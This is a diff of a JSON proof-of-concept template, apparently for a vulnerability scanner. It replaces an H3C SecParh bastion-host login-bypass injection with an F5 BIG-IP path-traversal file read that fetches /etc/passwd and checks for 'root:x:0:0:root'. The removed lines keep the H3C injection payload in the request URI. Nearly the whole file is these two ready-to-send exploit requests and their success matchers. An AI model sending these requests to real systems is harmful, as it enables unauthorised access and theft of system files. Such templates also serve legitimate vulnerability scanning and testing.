@@ -1,14 +1,14 @@
 {
-    "Name": "H3C SecParh堡垒机任意用户登录",
-    "Description": "H3C SecParh堡垒机任意用户登录",
-    "Product": "H3C",
+    "Name": "F5 BIG-IP Arbitrary File Read",
+    "Description": "F5 BIG-IP arbitrary file read",
+    "Product": "F5_bigip",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
+        "Uri":"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -19,12 +19,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "错误的id"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "审计管理员"
-                    },
+                "Value": "root:x:0:0:root"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -35,4 +31,3 @@
         "Next_decide":""
                 }
 ]}
-
